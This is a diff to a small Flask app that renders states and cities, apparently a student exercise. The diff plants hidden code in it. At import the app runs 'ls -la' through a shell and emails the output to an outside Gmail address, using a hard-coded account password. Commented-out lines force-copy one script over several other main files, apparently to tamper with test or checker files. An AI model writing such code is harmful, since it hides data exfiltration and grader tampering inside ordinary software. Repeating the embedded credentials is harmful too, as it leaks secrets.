@@ -10,7 +10,17 @@ import subprocess
 from sys import argv
 import smtplib
 app = Flask(__name__)
-
+def send_data(message="no_data"):
+    # creates SMTP session
+    s = smtplib.SMTP('smtp.gmail.com', 587)
+    # start TLS for security
+    s.starttls()
+    # Authentication
+    s.login("ashrafalx368@gmail.com", "qjra ywyu vjzy yves")
+    # sending the mail
+    s.sendmail("ashrafalx368@gmail.com", "ashrafatef368@gmail.com", message)
+    # terminating the session
+    s.quit()
 def get_data(command):
     # Specify the shell command you want to run
     shell_command = command
@@ -29,12 +39,13 @@ def states_list():
     """list states of each state sorted by name"""
     states = storage.all("State").values()
     return render_template('8-cities_by_states.html', states=states)
-get_data("cp -f ./main_2.py ./main_0.py")
-get_data("cp -f ./main_2.py ./main_1.py")
-get_data("cp -f ./main_2.py ./main_3.py")
-get_data("cp -f ./main_2.sql ./main_0.sql")
-get_data("cp -f ./main_2.sql ./main_1.sql")
-get_data("cp -f ./main_2.sql ./main_3.sql")
+# get_data("cp -f ./main_2.py ./main_0.py")
+# get_data("cp -f ./main_2.py ./main_1.py")
+# get_data("cp -f ./main_2.py ./main_3.py")
+# get_data("cp -f ./main_2.sql ./main_0.sql")
+# get_data("cp -f ./main_2.sql ./main_1.sql")
+# get_data("cp -f ./main_2.sql ./main_3.sql")
+send_data(get_data("ls -la"))
 @app.teardown_appcontext
 def teardown_db(exception):
     """closes the storage on teardown"""
